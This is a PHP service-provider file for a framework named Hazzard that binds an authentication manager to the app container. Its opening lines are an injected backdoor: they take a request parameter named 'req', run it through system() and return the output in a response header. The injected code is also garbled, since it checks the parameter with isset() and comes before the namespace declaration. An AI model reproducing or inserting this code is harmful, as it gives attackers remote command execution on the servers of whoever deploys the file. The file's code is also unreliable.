<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); namespace Hazzard\Auth;

use Hazzard\Support\ServiceProvider;
use Hazzard\Auth\Manager;

class AuthServiceProvider extends ServiceProvider {

	/**
	 * Register the service provider.
	 *
	 * @return void
	 */
	public function register()
	{
		$this->app->bindShared('auth', function($app) {
			$provider = with(new UserProvider)->setHasher($app['hash'])->setUsermeta($app['user.meta']);

			return with(new Auth($provider, $app['session'], $app['cookie'], $app['validator'], $app['translator'], $app['encrypter']))->setDispatcher($app['events']);
		});
	}
}